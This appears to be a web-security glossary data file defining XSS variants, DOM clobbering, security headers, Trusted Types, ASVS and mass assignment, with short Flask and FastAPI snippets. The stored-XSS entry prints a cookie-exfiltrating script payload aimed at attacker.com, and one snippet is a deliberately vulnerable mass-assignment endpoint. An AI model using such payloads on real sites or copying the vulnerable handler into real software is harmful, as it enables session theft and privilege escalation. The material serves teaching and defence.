# Fetch metadata resource isolation policy (Flask)
# Reference: https://web.dev/fetch-metadata/
from flask import request, abort

PUBLIC_PATHS = frozenset(["/api/public", "/health", "/robots.txt"])

@app.before_request
def fetch_metadata_check():
    """Block cross-site requests to non-public endpoints."""
    if request.path in PUBLIC_PATHS:
        return  # open to all origins

    site = request.headers.get("Sec-Fetch-Site", "")
    mode = request.headers.get("Sec-Fetch-Mode", "")

    # Allow: no header (non-browser client, curl, etc.)
    if not site:
        return
    # Allow: same-origin and direct navigation ('none' = user typed URL)
    if site in ("same-origin", "none"):
        return
    # Allow: cross-site top-level GET navigations (links from other sites)
    if site in ("cross-site", "same-site") and mode == "navigate" and request.method == "GET":
        return

    # Reject: cross-site sub-resource or form submission requests
    abort(403)

words.etymology: Sec-Fetch is a compound: 'Sec-' (the prefix for browser-enforced forbidden headers, itself from 'security') + 'Fetch' (referring to the Fetch API specification that defines resource loading); the four Sec-Fetch-* headers are specified in the W3C Fetch Metadata Request Headers specification, first shipped in Chrome 76 (2019).

words.shortDefinition: XSS variant where attacker-controlled data flows through the DOM to an unsafe sink without touching the server.
words.simpleDefinition: DOM-based XSS occurs entirely in the browser. The attacker injects a payload into a source the browser exposes (location.hash, location.search, document.referrer, postMessage) and it flows through JavaScript to an unsafe sink (innerHTML, eval(), document.write) without the server ever seeing the malicious input. The server response is clean; only the browser is the victim.
words.longDefinition: DOM-based XSS was first classified by Amit Klein in 2005 and is fundamentally different from reflected or stored XSS: the server response contains no payload. The vulnerability exists in client-side JavaScript that reads from a taint source and writes to a dangerous sink without sanitization. Taint sources (attacker-controlled values read by JS): location.href, location.hash, location.search, document.URL, document.referrer, window.name, postMessage data, IndexedDB data, localStorage/sessionStorage (if populated by another vulnerability). Unsafe sinks (operations that can interpret strings as code or markup): element.innerHTML, element.outerHTML, document.write(), document.writeln(), eval(), setTimeout(string), setInterval(string), Function(string), jQuery's $(attacker_string), location.href (open redirect). A payload example: the URL https://example.com/page# — if JS reads location.hash and writes it to innerHTML, the XSS fires. DOM-based XSS is harder to detect with server-side DAST scanners because the payload never reaches the server; browser-side analysis tools (Burp's DOM Invader, taint analysis engines) are required. The defense: use textContent instead of innerHTML for text insertion; use DOM creation methods (createElement, createTextNode) instead of HTML string concatenation; apply DOMPurify for cases where HTML rendering is required; use Trusted Types to block unsafe DOM sinks at the browser level.
words.connector: Think of DOM-based XSS like a local drug smuggling ring that never crosses a border checkpoint — the contraband (payload) moves entirely within the city (browser), making border (server-side) security ineffective.
words.techContext: Our client-side code audit found ten locations where location.hash was written to innerHTML; we replaced each with textContent or DOMPurify.sanitize() to eliminate the DOM-XSS attack surface.
words.exampleSentence: The DOM-based XSS escaped the WAF entirely because the payload never hit the server — it lived in the URL fragment and was processed exclusively by the client-side router's template injection.
words.etymology: DOM-based XSS is named for the Document Object Model (DOM), the browser's in-memory tree representation of a web page, which is the medium through which the attack flows; first documented by Amit Klein in 2005.

words.shortDefinition: XSS payload persisted in the database and served to every user who views the affected page.
words.simpleDefinition: Stored (persistent) XSS is the most dangerous XSS variant. The attacker submits a malicious script in user-generated content — a comment, profile bio, or message — and the server stores it in the database. Every user who loads the page with that content receives the payload and executes it, giving the attacker persistent code execution in the browsers of an unlimited number of victims.
words.longDefinition: Stored XSS differs from reflected XSS in its persistence and scale: one submission compromises every subsequent visitor. Attack vectors: any input stored to a database and later rendered as HTML — forum posts, comments, profile names, product reviews, chat messages, file names. A classic stored XSS payload: <script>document.location='https://attacker.com/steal?cookie='+document.cookie</script> inserted into a comment field. If the comment is rendered without output encoding, every reader's session cookie is exfiltrated. Session cookies with HttpOnly prevent JS cookie access but do not prevent other XSS abuse (CSRF, DOM manipulation, credential harvesting). High-impact real-world cases: the Samy Worm (2005) — a MySpace stored XSS that added the attacker as a friend and replicated itself to each visitor's profile; the British Airways breach (2018, disputed attribution) — a script skimmer injected into the payment page exfiltrated 380,000 payment records. The fundamental defense: output-encode all user-supplied data when rendering in HTML context. The encoding context matters: HTML entity encoding for HTML content (<, >, &, ", '), JavaScript string encoding for data in script blocks, URL encoding for href/src attributes. Template engines like Jinja2, Handlebars, and React's JSX apply context-aware auto-escaping by default — disabling it (|safe, dangerouslySetInnerHTML) re-opens the vulnerability.
words.connector: Think of stored XSS like a poisoned water cooler — one person adds the poison (attacker submits payload), and every person who drinks (visits the page) is affected, not just the one who was targeted.
words.techContext: The penetration test found stored XSS in the user bio field; sanitizing the output with context-aware encoding in the Jinja2 template fixed all 47 related instances because we use auto-escaping globally.
words.exampleSentence: The stored XSS in the support ticket title field went undetected for three weeks; every support agent who opened a ticket with that title had their session cookie exfiltrated.
words.etymology: Stored XSS is also called persistent XSS because the payload persists in the server's data store; the 'stored' name distinguishes it from reflected (non-persistent) and DOM-based variants.

words.shortDefinition: XSS payload embedded in a URL; the server reflects it back in the response, executing in the victim's browser.
words.simpleDefinition: Reflected XSS requires tricking a specific victim into clicking a crafted URL. The payload is not stored on the server — it travels in the URL as a query parameter or fragment. The server includes it in the HTML response without encoding, and the browser executes it. The attack scope is one victim per click, but a phishing email or short URL can deliver it at scale.

words.shortDefinition: HTTP response headers (CSP, HSTS, X-Frame-Options, etc.) that activate browser-enforced security policies.
words.simpleDefinition: Security headers are HTTP response headers that instruct the browser to apply specific security policies to a page. They are one of the highest-leverage defensive mechanisms because they can neutralize entire vulnerability classes — CSP for XSS, HSTS for SSL stripping, X-Frame-Options for clickjacking — with a single configuration change rather than code-level fixes.
words.longDefinition: Security headers represent the browser's side of defense-in-depth: even if server-side controls fail (XSS bypass, injection), browser-enforced policies provide a backstop. The core security headers: (1) Content-Security-Policy — restricts script/style/resource sources, prevents XSS execution; (2) Strict-Transport-Security — forces HTTPS, prevents SSL stripping and cookie hijacking; (3) X-Frame-Options — prevents clickjacking iframe embedding (superseded by CSP frame-ancestors); (4) X-Content-Type-Options: nosniff — prevents MIME sniffing attacks where browsers interpret a response as a different content type; (5) Referrer-Policy — controls how much of the URL is sent in the Referer header (privacy and information leakage); (6) Permissions-Policy (formerly Feature-Policy) — controls browser feature access (camera, microphone, geolocation) by origin; (7) Cross-Origin-Opener-Policy (COOP) and Cross-Origin-Embedder-Policy (COEP) — isolate cross-origin resources to prevent Spectre-style attacks. Security header auditing: securityheaders.com provides a free scanner and grade. Common misconfiguration: deploying headers only on the home page rather than all responses; setting an overly permissive CSP with unsafe-inline that negates XSS protection. Operational approach: deploy new headers in report-only mode first, monitor violations, then switch to enforcement.
words.connector: Think of security headers like the safety features on a modern car — airbags, lane-keeping, automatic braking: your server sends a response, and the browser's built-in safety systems activate based on the instructions.
words.techContext: Running securityheaders.com against our app revealed missing X-Content-Type-Options and Referrer-Policy headers; we added a middleware that applies all security headers to every response in under two hours.
words.exampleSentence: The compliance audit required a minimum security header score of A on securityheaders.com, so the team added a centralized middleware that applies CSP, HSTS, X-Frame-Options, and X-Content-Type-Options to every response.

from flask import Flask

app = Flask(__name__)

# Centralized security headers middleware
@app.after_request
def add_security_headers(response):
    response.headers['Strict-Transport-Security'] = (
        'max-age=31536000; includeSubDomains; preload'
    )
    response.headers['X-Content-Type-Options']  = 'nosniff'
    response.headers['X-Frame-Options']         = 'SAMEORIGIN'
    response.headers['Referrer-Policy']         = 'strict-origin-when-cross-origin'
    response.headers['Permissions-Policy']      = (
        'camera=(), microphone=(), geolocation=()'
    )
    # CSP set separately (nonce-based, per-request)
    return response

words.etymology: Security headers is an informal collective term for HTTP response headers that activate defensive browser behaviors; individual headers have independent origins spanning 2009 (X-Frame-Options) through 2021 (Cross-Origin-Opener-Policy).

words.shortDefinition: HTML injection technique that exploits the browser's automatic exposure of named elements as global JavaScript variables, overwriting legitimate variables or configuration objects.
words.simpleDefinition: Browsers automatically expose named form fields, elements with id attributes, and anchor tags as properties on the global window object and document object. DOM clobbering exploits this: if a page uses window.someVar for configuration and an attacker can inject <a id='someVar' href='javascript:...'>, they have overwritten the variable. The result is XSS-equivalent code execution without injecting a script tag.
words.longDefinition: DOM clobbering is an HTML injection technique that abuses the legacy HTML Named Access feature: browsers automatically create global JavaScript properties for elements with certain id and name attributes. The feature dates to early browser implementation and is specified in the HTML Living Standard. Specifically: document[id] and window[id] resolve to the element; forms expose their field names as properties on the form element; anchor elements with href expose their URL via .toString(). An attacker who can inject arbitrary HTML (but not JavaScript — for example, a sanitizer blocks script tags but allows certain HTML) can leverage DOM clobbering. Attack patterns: (1) overriding a script-accessible variable — if application code reads window.config = window.config || {}, injecting <a id='config' href='https://attacker.com/'> makes config a DOM element whose toString() returns the attacker's URL; (2) bypassing sanitizers — some sanitizers do not account for DOM clobbering; an id on an injected element can interfere with existing DOM-reading JavaScript; (3) CSP bypass — DOM clobbering cannot execute script directly, but it can redirect the result of a script reading a 'safe' property to attacker-controlled content, enabling a second-stage XSS; (4) overriding security-relevant globals — a JavaScript framework that stores a nonce, CSP reference, or allowed-origin list in a DOM-readable global can have that value replaced. Defense: avoid reading security-sensitive values from DOM properties; use explicit JavaScript variables (const, let, not var) that cannot be overwritten by DOM elements; use DOMPurify with the FORCE_BODY option and SANITIZE_DOM setting; avoid relying on id attributes for security configuration.
words.connector: Think of DOM clobbering like a squatter claiming a reserved seat by sitting down before the intended occupant arrives — the browser hands out seat-reservation certificates (global variable names) to any HTML element with the right id, and the first one to sit overrides the legitimate tenant.
words.techContext: Our sanitizer's DOMPurify configuration now sets SANITIZE_DOM: true (enabled by default), which removes id and name attributes whose values would collide with existing DOM properties and JavaScript globals, blocking DOM clobbering payloads.
words.exampleSentence: The markdown-to-HTML converter allowed id attributes on elements; a researcher demonstrated DOM clobbering by injecting an id that overwrote the application's window.CSP_NONCE variable, causing subsequent scripts to use the attacker's value.
words.etymology: DOM (Document Object Model — the browser's in-memory tree of a web page's elements) + clobbering (overwriting or displacing — from informal technical usage meaning to overwrite a memory region or variable); the term was established in web security research in the 2010s to describe this specific HTML injection category.

words.shortDefinition: Application Security Verification Standard; structured checklist of security controls at three levels of rigor.
words.simpleDefinition: OWASP ASVS turns the Top 10 awareness list into a testable verification framework. It organizes hundreds of specific security requirements across 14 control areas into three levels of rigor. Level 1 is verifiable by automated scanning; Level 2 requires code review; Level 3 is for critical applications requiring formal security architecture evidence.
words.longDefinition: The OWASP Application Security Verification Standard (ASVS) was first released in 2008 and is now in version 5.0 (2025), the current authoritative edition. It is organized into 14 chapters: architecture, authentication, session management, access control, validation/sanitization/encoding, stored cryptography, error handling, data protection, communications, malicious code, business logic, files/resources, APIs/web services, and configuration. Three verification levels: V1 (Opportunistic) — verifiable through automated testing, DAST, and basic pen testing; V2 (Standard) — verifiable through code review plus testing; V3 (Advanced) — formal architecture and threat model documentation required. ASVS v5.0 changes include a new Cryptography chapter incorporating post-quantum guidance, restructured access control requirements, and expanded API security controls. Primary use cases: (1) development guidance — teams map ASVS requirements to user stories and acceptance criteria before writing code; (2) penetration test scope — standardizes what an assessment covers, making results comparable; (3) procurement — buyers require ASVS Level 2 compliance from vendors as a contractual baseline. The relationship to the Top 10: the Top 10 says 'these are the ten most dangerous patterns'; ASVS says 'here are the specific controls to prevent them and how to verify they work'. ASVS Level 2 is the appropriate target for most business applications handling sensitive data; regulated industries (healthcare, finance) should target Level 3.
words.connector: Think of OWASP ASVS like an inspector's checklist for a building code — the Top 10 tells you which building failures kill people, while ASVS tells you exactly which bolts to check, what torque rating to use, and how to document the inspection.
words.techContext: Our security team uses ASVS Level 2 requirements as acceptance criteria in Jira; every new feature has an ASVS mapping, and the security engineer signs off that each applicable control is implemented before release.
words.exampleSentence: The fintech startup used OWASP ASVS Level 2 as their security requirements specification during development, which allowed the external pen test to proceed with a clear scope and comparable results.

words.shortDefinition: Browser API requiring scripts to use safe-typed objects for DOM sinks, preventing DOM-based XSS at the platform level.
words.simpleDefinition: Trusted Types is a browser security feature that closes DOM-based XSS at the source. Once a Trusted Types policy is active (via CSP), JavaScript can no longer assign a raw string to dangerous DOM sinks like innerHTML — it must use a TrustedHTML object returned by a registered policy function. This turns runtime XSS into a build-time type error that security reviewers can audit.
words.longDefinition: Trusted Types was designed by Krzysztof Kotowicz at Google and shipped in Chrome 83 (2020); it is now supported in Chrome, Edge, and available as a polyfill for other browsers. The mechanism: enable with the CSP header require-trusted-types-for 'script'; code that assigns an untyped string to a DOM sink (innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, new Function, location.href) throws a TypeError at runtime. To write to a sink, code must call a registered Trusted Types policy: const policy = trustedTypes.createPolicy('default', { createHTML: (s) => DOMPurify.sanitize(s) }); element.innerHTML = policy.createHTML(userInput). This concentrates all HTML sinks into a small number of auditable policy functions. Google's internal adoption data showed Trusted Types eliminated the entire class of DOM-XSS for apps that fully adopted it. CSP directive: require-trusted-types-for 'script' (enforces for all scripts) plus trusted-types policy-name (allowlists specific policy names). Migration path for existing codebases: use report-only mode first, identify violations with Chrome DevTools / browser extensions, refactor to policy-wrapped calls, then switch to enforcement. Trusted Types requires CSP Level 3 and is incompatible with some older JavaScript patterns that dynamically generate HTML via string concatenation.
words.connector: Think of Trusted Types like a type-safe API replacing C's gets() with a bounded read function — the language (browser) now enforces at runtime that HTML can only enter dangerous sinks through an approved sanitization gate.
words.techContext: We adopted Trusted Types in report-only mode to discover every innerHTML assignment in our React app; after replacing raw string assignments with DOMPurify-wrapped policies, we enabled enforcement and eliminated the DOM-XSS surface entirely.
words.exampleSentence: After Trusted Types enforcement was enabled, a developer accidentally introduced an innerHTML assignment in a new component and the TypeError immediately surfaced during automated testing, before reaching production.
words.etymology: Trusted Types was designed by Krzysztof Kotowicz at Google to bring type safety to DOM manipulation, analogous to how typed languages prevent string-injection vulnerabilities at compile time; the name reflects the creation of 'trusted' typed objects that the browser accepts for sink operations.

words.shortDefinition: API vulnerability where the server binds all request fields to model attributes, letting attackers set privileged fields.
words.simpleDefinition: Mass assignment occurs when a framework auto-binds all fields in an HTTP request body to a data model object without an explicit allowlist. A user updating their profile can include an 'isAdmin: true' or 'accountBalance: 99999' field — fields the UI never showed — and the server blindly applies them. The fix is an explicit allowlist of fields that users may set.
words.longDefinition: Mass assignment (also called parameter binding or auto-binding) is listed in the OWASP Top 10 2021 under A04 (Insecure Design) and in the API Security Top 10 as API3 (Broken Object Property Level Authorization). It is prevalent in frameworks that map HTTP request bodies directly to ORM models: Rails strong_parameters was introduced specifically to fix this; similar issues affect Spring, Django REST Framework (when using ModelSerializer without explicit field restrictions), and any framework with automatic binding. The attack pattern: the attacker studies the API's data models (from documentation, JavaScript source, or error messages), discovers field names not exposed in the UI, and submits them in a crafted request. Real-world cases: the 2012 GitHub mass assignment vulnerability — a researcher added his SSH key to the Rails organization by exploiting auto-binding in the user controller; mass assignment vulnerabilities have been documented in HackerOne reports across dozens of platforms. Defense approaches: (1) explicit allowlist — only accept named fields: validate(request.body, ['name', 'email']); (2) dedicated DTOs (Data Transfer Objects) — separate request models from database models; (3) read-only fields — mark privileged fields with annotations/decorators that prevent binding; (4) default-deny — ORM models should require explicit opt-in for each bindable field. The OWASP API Security Top 10 2023 frames this as Broken Object Property Level Authorization (API3): the API allows writing to properties the caller should not be able to modify.
words.connector: Think of mass assignment like a moving company that unloads every box wherever they want based on the label — if an attacker slips a box labeled 'admin override: true' into the shipment, it gets unpacked into the wrong room.
words.techContext: After the GitHub-style mass assignment finding in our user controller, we introduced explicit DTO classes for all API endpoints, ensuring that database model fields like isAdmin and stripeCustomerId can never be set via the public API.
words.exampleSentence: The penetration test demonstrated mass assignment by adding 'role=admin' to a profile update request; the framework applied every request field directly to the ORM model without checking which fields were user-settable.

from pydantic import BaseModel
from typing import Optional

# VULNERABLE: update user with all request fields
# (FastAPI/SQLAlchemy without field restriction)
@app.put('/users/{user_id}')
async def update_user_vulnerable(user_id: int, data: dict, db: Session = Depends(get_db)):
    user = db.get(User, user_id)
    for key, value in data.items():
        setattr(user, key, value)  # attacker can set is_admin, balance, etc.
    db.commit()

# SECURE: explicit DTO with only user-settable fields
class UserUpdateDTO(BaseModel):
    display_name: Optional[str] = None
    email: Optional[str] = None
    # is_admin, balance, created_at NOT included — cannot be set via API

@app.put('/users/{user_id}')
async def update_user_secure(user_id: int, data: UserUpdateDTO, db: Session = Depends(get_db)):
    user = db.get(User, user_id)
    update_data = data.dict(exclude_unset=True)  # only provided fields
    for key, value in update_data.items():
        setattr(user, key, value)
    db.commit()

words.etymology: Mass assignment is named for the 'mass' (bulk) application of all submitted fields to a model in a single operation; the vulnerability was widely publicized after the 2012 GitHub incident and the term became standard in the Rails community before spreading broadly.
